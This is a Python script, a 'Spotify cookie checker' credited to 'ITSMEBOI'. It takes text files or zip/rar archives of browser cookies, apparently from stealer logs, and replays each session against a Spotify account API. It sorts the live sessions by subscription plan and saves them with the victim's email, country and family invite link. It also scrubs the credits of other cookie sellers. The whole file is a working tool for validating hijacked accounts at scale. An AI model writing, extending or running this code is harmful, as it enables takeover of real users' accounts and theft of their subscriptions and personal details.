#!/usr/bin/env python3

import requests
import os
import json
import threading
import sys
import zipfile
import rarfile
import re
from termcolor import colored

# Directory structure
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIES_DIR = os.path.join(BASE_DIR, "cookies")
WORKING_COOKIES_DIR = os.path.join(BASE_DIR, "working_cookies")

# Results dictionary
results = {
    'hits': 0, 'bad': 0, 'errors': 0,
    'family': 0, 'duo': 0, 'student': 0,
    'premium': 0, 'free': 0, 'unknown': 0
}
lock = threading.Lock()

# Ensure directories exist
os.makedirs(COOKIES_DIR, exist_ok=True)
os.makedirs(WORKING_COOKIES_DIR, exist_ok=True)

# Plan name mapping
def plan_name_mapping(plan):
    if not plan:
        return "Unknown"
    plan_lower = plan.lower()
    if "student" in plan_lower:
        return "Student"
    if "family" in plan_lower:
        return "Family"
    if "duo" in plan_lower:
        return "Duo"
    if "premium" in plan_lower:
        return "Premium"
    if "free" in plan_lower:
        return "Free"
    return "Unknown"

# Format and save cookie data
def format_cookie_file(data, cookie_content):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"
    invite_link = data.get('familyInviteLink') or data.get('duoInviteLink')
    email = data.get('email', 'N/A')

    header = f"""
    ─────────────────────────────────────────────────────────────
    PLAN       : {plan}
    COUNTRY    : {country}
    AutoPay    : {auto_pay}
    Trial      : {trial}
    Invite Link: {invite_link if invite_link else "N/A"}
    Email      : {email}
    checker by : ITSMEBOI
    
    ─────────────────────────────────────────────────────────────

    {cookie_content}
    
    ─────────────────────────────────────────────────────────────
                    CHECKER BY ITSMEBOI
    ─────────────────────────────────────────────────────────────
    """
    return header, plan

# Remove unwanted content
def remove_unwanted_content(cookie_content):
    unwanted_content = [
        "BY https://t.me/redg3n",
        "https://dsc.gg/r3dg3n",
        "Checker By: github.com/harshitkamboj"
    ]
    for line in unwanted_content:
        cookie_content = cookie_content.replace(line, "")
    return cookie_content

# Check if string is a valid cookie
def is_cookie_line(line):
    # Check if line has typical cookie format with domain, path, etc.
    parts = line.strip().split('\t')
    return len(parts) >= 7

# Extract cookies from file
def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        cookies = []
        for line in content.splitlines():
            if is_cookie_line(line):
                cookies.append(line)
        
        return '\n'.join(cookies) if cookies else None
    except Exception as e:
        print(f"Error reading file {file_path}: {e}")
        return None

# Check single cookie
def check_single_cookie(cookie_content, filename):
    if not cookie_content or not cookie_content.strip():
        with lock:
            results['errors'] += 1
        return None, f"⚠ Empty cookie content in {filename}"

    try:
        cookies_dict = {}
        for line in cookie_content.splitlines():
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                _, _, _, _, _, name, value = parts[:7]
                cookies_dict[name] = value

        if not cookies_dict:
            with lock:
                results['errors'] += 1
            return None, f"⚠ No valid cookies found in {filename}"

        session = requests.Session()
        session.cookies.update(cookies_dict)
        session.headers.update({'Accept-Encoding': 'identity'})

        response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer")

        with lock:
            if response.status_code == 200:
                data = response.json()
                plan = plan_name_mapping(data.get("currentPlan", "unknown"))
                
                # Update plan counts
                results['hits'] += 1
                plan_lower = plan.lower()
                if plan_lower in results:
                    results[plan_lower] += 1
                else:
                    results['unknown'] += 1
                
                message = f"✔ Login successful: {filename} ({plan})"
                
                # Format and save cookie
                formatted_cookie, plan = format_cookie_file(data, remove_unwanted_content(cookie_content))
                plan_folder = os.path.join(WORKING_COOKIES_DIR, plan.replace(" ", "_").lower())
                os.makedirs(plan_folder, exist_ok=True)
                
                cookie_file_path = os.path.join(plan_folder, f"{filename}.txt")
                with open(cookie_file_path, 'w', encoding='utf-8') as out_f:
                    out_f.write(formatted_cookie)
                
                return cookie_file_path, message
            else:
                results['bad'] += 1
                return None, f"✘ Login failed: {filename}"

    except Exception as e:
        with lock:
            results['errors'] += 1
        return None, f"⚠ Error checking {filename}: {e}"

# Extract files from archive
def extract_from_archive(archive_path, extract_dir):
    try:
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            return True
        elif file_ext == '.rar':
            with rarfile.RarFile(archive_path, 'r') as rar_ref:
                rar_ref.extractall(extract_dir)
            return True
        else:
            print(f"Unsupported archive format: {file_ext}")
            return False
    except Exception as e:
        print(f"Error extracting {archive_path}: {e}")
        return False

# Process a single file
def process_file(file_path, filename):
    file_ext = os.path.splitext(file_path)[1].lower()
    
    # Handle archives
    if file_ext in ['.zip', '.rar']:
        temp_extract_dir = os.path.join(COOKIES_DIR, os.path.splitext(filename)[0])
        os.makedirs(temp_extract_dir, exist_ok=True)
        
        if extract_from_archive(file_path, temp_extract_dir):
            valid_cookies = []
            errors = []
            
            # Walk through extracted files
            for root, _, files in os.walk(temp_extract_dir):
                for extracted_file in files:
                    if extracted_file.endswith('.txt'):
                        extracted_path = os.path.join(root, extracted_file)
                        cookie_content = extract_cookies_from_file(extracted_path)
                        
                        if cookie_content:
                            cookie_path, message = check_single_cookie(cookie_content, extracted_file)
                            if cookie_path:
                                valid_cookies.append((cookie_path, message))
                            else:
                                errors.append(message)
            
            # Clean up temp directory
            for root, dirs, files in os.walk(temp_extract_dir, topdown=False):
                for name in files:
                    os.remove(os.path.join(root, name))
                for name in dirs:
                    os.rmdir(os.path.join(root, name))
            os.rmdir(temp_extract_dir)
            
            return valid_cookies, errors
    
    # Handle txt files
    elif file_ext == '.txt':
        cookie_content = extract_cookies_from_file(file_path)
        if cookie_content:
            cookie_path, message = check_single_cookie(cookie_content, filename)
            if cookie_path:
                return [(cookie_path, message)], []
            else:
                return [], [message]
    
    return [], [f"Unsupported file format: {file_ext}"]

# Main function to check cookies
def check_cookies(input_file):
    # Save the file to cookies directory
    temp_file_path = os.path.join(COOKIES_DIR, os.path.basename(input_file))
    os.makedirs(os.path.dirname(temp_file_path), exist_ok=True)
    
    with open(input_file, 'rb') as src, open(temp_file_path, 'wb') as dst:
        dst.write(src.read())
    
    # Process the file
    valid_cookies, errors = process_file(temp_file_path, os.path.basename(input_file))
    
    # Clean up
    if os.path.exists(temp_file_path):
        os.remove(temp_file_path)
    
    # Generate summary
    summary = {
        "status": "completed",
        "total_checked": results['hits'] + results['bad'] + results['errors'],
        "valid": results['hits'],
        "invalid": results['bad'],
        "errors": results['errors'],
        "premium": results['premium'],
        "family": results['family'],
        "duo": results['duo'],
        "student": results['student'],
        "free": results['free'],
        "unknown": results['unknown'],
        "valid_cookies": [path for path, _ in valid_cookies],
        "messages": [msg for _, msg in valid_cookies] + errors
    }
    
    # Save summary to JSON
    summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
    with open(summary_path, 'w') as f:
        json.dump(summary, f, indent=2)
    
    return summary_path

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python spotify_cookie_checker.py <file_path>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    if not os.path.exists(input_file):
        print(f"File not found: {input_file}")
        sys.exit(1)
    
    summary_path = check_cookies(input_file)
    print(f"Results saved to: {summary_path}")